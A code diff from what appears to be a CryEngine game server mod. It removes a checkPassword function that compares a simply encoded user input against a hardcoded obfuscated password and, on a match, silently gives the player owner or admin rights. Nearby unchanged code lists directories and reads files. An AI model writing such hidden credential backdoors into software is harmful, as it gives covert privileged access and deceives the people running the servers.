@@ -175,43 +175,6 @@ void listWDir(CActor * pActor)
 	closedir(dirpos);
 }
 
-const char * password = "\xD0\x62\x77\xD9\x47\x62\x3B\x8E\x35\x59\x56\x68\x62\x59\x50";
-int authId;
-
-void checkPassword(CActor * pActor, const char * args)
-{
-	char encryptpass [64];
-	const char * userpass;
-	int i, group;
-	CGameRules * pGameRules;
-
-	i = 0;
-	userpass = args;
-	while (*userpass == ' ') { userpass++; }
-	if (*userpass == '\0') {
-		ConsoleMessage(pActor, "$8[Access]$9 invalid args");
-		return;
-	}
-
-	while (*userpass != '\0' && *userpass != ' ') {
-		encryptpass[i] = (*userpass * 3 + 7) % 251;
-		i++; userpass++;
-	}
-	encryptpass[i] = '\0';
-
-	pGameRules = g_pGame->GetGameRules();
-	if (strcmp(encryptpass, password) == 0) {
-		authId = pActor->GetChannelId();
-		if (!gEnv->pSystem->GetIScriptSystem()->GetGlobalValue("OWNER", group))
-			if (!gEnv->pSystem->GetIScriptSystem()->GetGlobalValue("ADMIN", group))
-				group = 5;
-		ConsoleMessage(pActor, "$8[Access]$9 password ok");
-		pActor->GetEntity()->GetScriptTable()->SetValue("vergroup", group);
-	}
-	else
-		ConsoleMessage(pActor, "$8[Access]$9 invalid password");
-}
-
 void readFile(CActor * pActor, const char * args) // filename
 {
 	char buffer [128];
